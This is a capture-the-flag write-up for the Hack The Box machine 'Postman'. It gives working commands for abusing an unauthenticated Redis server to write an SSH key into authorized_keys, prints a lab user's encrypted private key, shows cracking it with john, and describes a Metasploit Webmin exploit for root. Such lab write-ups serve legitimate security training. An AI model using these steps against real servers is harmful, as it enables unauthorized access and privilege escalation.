---
layout: single
title: Postman - Hack The Box
excerpt: "Postman was a somewhat frustrating box because we had to find the correct user directory where to write our SSH key using the unprotected Redis instance. I expected to be able to use a wordlist to scan through /home and find a valid user but on this box the redis user was configured with a valid login shell so I had to guess that and write my SSH key to /var/lib/redis/.ssh instead. The rest of the box was pretty straightforward, crack some SSH private key then pop a root shell with a Webmin CVE."
date: 2020-03-14
classes: wide
header:
  teaser: /assets/images/htb-writeup-postman/postman_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - redis
  - webmin
  - ssh
---

![](/assets/images/htb-writeup-postman/postman_logo.png)

Postman was a somewhat frustrating box because we had to find the correct user directory where to write our SSH key using the unprotected Redis instance. I expected to be able to use a wordlist to scan through /home and find a valid user but on this box the redis user was configured with a valid login shell so I had to guess that and write my SSH key to /var/lib/redis/.ssh instead. The rest of the box was pretty straightforward, crack some SSH private key then pop a root shell with a Webmin CVE.

## Summary

- Use the unauthenticated Redis server to write our SSH public key to the redis user's authorized_keys file 
- From the redis user shell, discover the private key for user Matt inside /opt directory and crack it with john
- Use Matt's credentials to log in to Webmin and exploit CVE-2019-12840 to get a shell as root

## Portscan

The ports show the box is running SSH, Apache, Redis and Webmin:

```
root@kali:~# nmap -sC -sV -p- 10.10.10.160
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 16:33 EDT
Nmap scan report for 10.10.10.160
Host is up (0.019s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.76 seconds
```

## Website

The website is currently under construction and there is nothing on it, except a possible email address at the bottom.

![](/assets/images/htb-writeup-postman/website1.png)

![](/assets/images/htb-writeup-postman/website1a.png)

I scanned the website with gobuster to find hidden files and directories.

```
root@kali:~/htb# gobuster dir -t 50 -w /opt/SecLists/Discovery/Web-Content/big.txt -x php -u http://postman.htb

/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
/upload (Status: 301)
```

Indexing was enabled on `/upload` but there was nothing interesting in there.

![](/assets/images/htb-writeup-postman/upload.png)

## Webmin

Webmin is a web-based system configuration tool. As shown below, HTTPS is needed to connect to the port 10000.

![](/assets/images/htb-writeup-postman/webmin1.png)

![](/assets/images/htb-writeup-postman/webmin2.png)

The nmap scan I ran earlier already discovered the webmin version used on the system from the `Server` header: `MiniServ/1.910`

Based on Exploit-DB, I saw see there are multiple exploits available for this version:

```
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)
Webmin 1.920 - Remote Code Execution
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)
```

The Metasploit module for version 1.920 only works for the backdoored version of Webmin and doesn't work here on this box:

```
msf5 exploit(linux/http/webmin_backdoor) > run

[*] Started reverse TCP handler on 10.10.14.20:4444 
[-] Exploit aborted due to failure: not-vulnerable: Set ForceExploit to override
[*] Exploit completed, but no session was created.
```

The other exploit for CVE-2019-12840 requires authentication so I wasn't able to use it without creds.

> Description:
> This module exploits an arbitrary command execution vulnerability in 
> Webmin 1.910 and lower versions. Any user authorized to the "Package 
> Updates" module can execute arbitrary commands with root privileges.

## Redis

Next I checked out to the Redis instance. I used the redis-tools package to interact with Redis. As shown below, we don't need to be authenticated to read and write to the database.

![](/assets/images/htb-writeup-postman/redis1.png)

Because this instance of Redis is not protected, it's possible to write arbitrary data to disk using the Redis save functionality. For this attack, I uploaded my SSH public key to the home folder then I was able to SSH in to the box.

Here are the blogs that I used when doing the box:
- [http://antirez.com/news/96](http://antirez.com/news/96)
- [https://github.com/psmiraglia/ctf/blob/master/kevgir/000-redis.md](https://github.com/psmiraglia/ctf/blob/master/kevgir/000-redis.md)

First, I had to find a list of valid users on the box so I scanned for existing user directories using a wordlist and a [script](https://github.com/psmiraglia/ctf/blob/master/kevgir/scripts/redis-oracle.py).

I tried running a couple of wordlist without success then decided to manually verify what's going on.

![](/assets/images/htb-writeup-postman/redis2.png)

From the screenshot, we can see that the enumeration technique works: it returns an `OK` message if the directory is writeable, `No such file or directory` if it doesn't exist and `Permission denied` if we don't have access to it. I previously tried a whole bunch of directories inside `/home` but I don't even have access to its parent directory.

Finding the correct directory took a while. I installed redis to see what is the standard installation path. On Kali Linux, the apt installation creates the following user:

```
redis:x:133:145::/var/lib/redis:/usr/sbin/nologin
```

I verified that the directory exists on the box:

```
10.10.10.160:6379> CONFIG SET dir "/var/lib/redis"
OK
```

On a normal installation we would not be able to do anything with this user since the login shell is set to `/usr/sbin/nologin` but on Postman the login shell is set to `/bin/bash`. Here are the steps I followed to put my SSH key on the server.

Step 1. Generate blob to be injected

```
root@kali:~/htb/postman# echo -e '\n\n' >> blob.txt
root@kali:~/htb/postman# cat ~/.ssh/id_rsa.pub >> blob.txt
root@kali:~/htb/postman# echo -e '\n\n' >> blob.txt
```

Step 2. Update the Redis configuration

```
10.10.10.160:6379> CONFIG SET dbfilename "authorized_keys"
OK
10.10.10.160:6379> CONFIG SET dir "/var/lib/redis/.ssh"
OK
```

Step 3. Do the attack

```
root@kali:~/htb/postman# redis-cli -h 10.10.10.160 flushall
OK
root@kali:~/htb/postman# cat blob.txt | redis-cli -h 10.10.10.160 -x set sshblob
OK
root@kali:~/htb/postman# redis-cli -h 10.10.10.160 save
OK
```

And we can now log in to the box with SSH:

```
root@kali:~/htb/postman# ssh redis@10.10.10.160
The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.160' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$
```

## Getting Matt's credentials

The `/etc/passwd` file contains another user: `Matt`

```
[...]
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash
```

After looking around for a bit, I found Matt's SSH private key in `/opt`:

```
redis@Postman:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Sep 11  2019 .
drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
redis@Postman:/opt$ cat id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

We're able to crack the hash with John after converting it with ssh2john.

![](/assets/images/htb-writeup-postman/matt.png)

I tried SSHing in with the password but wasn't able to. However using `su` from the redis shell I can log in as `Matt`.

![](/assets/images/htb-writeup-postman/user.png)

Looking `/etc/ssh/sshd_config` we can see that Matt is specifically denied SSH access to the box so that's why I couldn't SSH in directly:

```
[...]
#deny users
DenyUsers Matt
```

## Privesc using webmin

Now that I have a valid user, I can use the Metasploit exploit for Webmin and get root shell.

![](/assets/images/htb-writeup-postman/root.png)